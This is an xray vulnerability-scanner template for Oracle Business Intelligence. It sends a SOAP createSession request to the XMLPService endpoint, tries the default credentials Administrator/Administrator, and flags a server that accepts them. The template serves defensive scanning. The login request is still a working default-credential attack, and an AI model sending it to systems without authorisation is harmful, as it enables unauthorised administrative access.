xray/O/oracle-business-intelligence-password.yaml

expression: r0()
id: oracle-business-intelligence-password
info:
  author: milo2012
  description: Oracle Business Intelligence default admin credentials were discovered.
  name: Oracle Business Intelligence Default Login
  reference:
  - https://docs.oracle.com/cd/E12096_01/books/AnyDeploy/AnyDeployMisc2.html
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'createSessionReturn')
    request:
      body: "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
        \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
        \ xmlns:rep=\"http://xmlns.oracle.com/oxp/service/report\">\n   <soapenv:Header/>\n\
        \   <soapenv:Body>\n      <rep:createSession soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\
        >\n         <username xsi:type=\"xsd:string\">Administrator</username>\n \
        \        <password xsi:type=\"xsd:string\">Administrator</password>\n    \
        \     <domain xsi:type=\"xsd:string\">bi</domain>\n      </rep:createSession>\n\
        \   </soapenv:Body>\n</soapenv:Envelope>\n"
      headers:
        Content-Type: text/xml
        SOAPAction: ''
      method: POST
      path: /xmlpserver/services/XMLPService
